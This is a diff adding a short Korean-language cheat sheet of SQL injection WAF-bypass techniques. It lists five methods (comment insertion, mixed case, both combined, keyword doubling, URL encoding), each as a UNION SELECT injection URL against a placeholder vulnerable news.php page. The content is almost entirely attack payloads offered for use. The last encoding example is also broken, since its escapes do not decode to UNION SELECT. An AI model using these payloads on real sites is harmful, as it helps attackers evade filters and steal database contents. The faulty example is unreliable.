@@ -1,0 +1,39 @@
+1.주석처리 기법
+
+정상적인 쿼리
+http://취약한사이트.com/news.php?id=79 union all select 1,2,3,4,5,6,7--
+
+WAF 우회용 쿼리
+http://취약한사이트.com/news.php?id=79/*union*/+/*all*/+/*select*/+1,2,3,4,5,6,7--
+
+2.구문의 대/소문자화 기법
+
+정상적인 쿼리
+http://취약한사이트.com/news.php?id=79 UNION SELECT 1,2,3,4,5,6,7--
+
+WAF 우회용 쿼리
+http://취약한사이트.com/news.php?id=79 uNiOn SEleCt 1,2,3,4,5,6,7--
+
+3.주석처리 기법 + 구문 대/소문자화 기법
+
+정상적인 쿼리
+http://취약한사이트.com/news.php?id=79 UNION SELECT 1,2,3,4,5,6,7--
+
+WAF 우회용 쿼리
+http://취약한사이트.com/news.php?id=79/*uNiON*/+/*!SeLeCT*/+1,2,3,4,5,6,7--
+
+4.키워드 대체기법
+
+정상적인 쿼리
+http://취약한사이트.com/news.php?id=79 UNION SELECT 1,2,3,4,5,6,7--
+
+WAF 우회용 쿼리
+http://취약한사이트.com/news.php?id=79 UNIunionON SEselectLECT 1,2,3,4,5,6,7--
+
+5.인라인 주석기법
+
+정상적인 주석처리 기법
+http://취약한사이트.com/news.php?id=79 UNION SELECT 1,2,3,4,5,6,7--
+
+WAF 우회용 쿼리
+http://취약한사이트.com/news.php?id=79 %55iON %52EleCT 1,2,3,4,5,6,7--
